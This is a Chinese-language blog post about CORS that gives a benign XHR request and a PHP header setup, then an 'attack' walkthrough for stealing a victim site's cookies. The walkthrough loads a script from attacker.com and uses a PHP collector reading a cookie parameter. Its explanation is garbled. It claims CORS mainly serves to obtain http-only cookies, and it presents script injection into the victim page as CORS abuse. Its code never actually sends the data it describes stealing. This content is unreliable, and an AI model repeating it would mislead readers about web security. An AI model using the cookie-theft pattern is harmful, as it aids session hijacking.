---
title: CORS
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 126
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142@qq.com
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - OWASP
  - CORS
categories:
  - OWASP
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter

---

<!--more-->

> 漏洞全称 跨域资源共享（Cross-origin resource sharing）。它是同源策略的扩展，使得不同源网站之间资源的访问更加灵活。
>
> 同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。同源的意思即为两个站点需要满足同协议，同域名，同端口这三个条件。
>
> 假如网站的CORS策略配置不当，它就有可能带来基于跨域的攻击。
> 所以归根结底，这还是一个配置不当引发的安全问题。

CORS最大的作用应该就是==拿到设置了http-only的cookie==

# CORS开发实现

## 前端

以下是一个使用JavaScript实现CORS的简单示例代码：

```javascript
javascriptCopy codevar xhr = new XMLHttpRequest();
xhr.open('GET', 'http://example.com/api/data', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('Origin', 'http://your-domain.com');
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var data = JSON.parse(xhr.responseText);
    // 处理返回的数据
  }
};
xhr.send();
```

在此示例中，我们创建一个XMLHttpRequest对象，并使用open方法指定请求的URL和请求类型。我们还将withCredentials属性设置为true，以便允许使用cookie进行身份验证。然后，我们设置Content-Type和Origin头部，并在readyState改变时检查响应状态。如果响应状态是200，我们解析响应文本并处理数据。

## 后端

```php
<?php
header('Access-Control-Allow-Origin: http://your-domain.com');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  header('Access-Control-Max-Age: 86400');
  header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
  header('Access-Control-Allow-Headers: Content-Type, Authorization');
  header('Access-Control-Allow-Credentials: true');
  header('Access-Control-Allow-Origin: http://your-domain.com');
  header('Content-Length: 0');
  header('Content-Type: text/plain');
  die();
}
// 在此处理其他请求逻辑
?>
```





# 攻击

> ps:归根结底，这还是一个配置不当引发的安全问题。配置正确就无法利用

假设您拥有一个受害者网站example.com，您可以使用以下步骤来利用CORS攻击来窃取其cookie：

1.在您拥有的攻击者网站中创建一个包含以下代码的JavaScript文件，以向example.com发起CORS请求并接收其响应：

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://example.com', true);
xhr.withCredentials = true;
xhr.onload = function() {
  var responseText = xhr.responseText;
  // 发送响应文本到攻击者网站的服务器
};
xhr.send();
```

2.在攻击者网站的服务器上，设置一个接收响应文本的脚本，例如：

```php
<?php
  $cookie = $_GET['cookie'];
  // 将cookie发送到攻击者网站的服务器
?>
```

3.将攻击者网站的JavaScript文件包含在您的受害者网站中，例如：

```javascript
<script src="http://attacker.com/cors.js"></script>
```

4.当用户访问受害者网站时，攻击者网站的JavaScript文件将被加载，发送CORS请求到example.com并将响应文本发送回攻击者网站的服务器，包括example.com的cookie。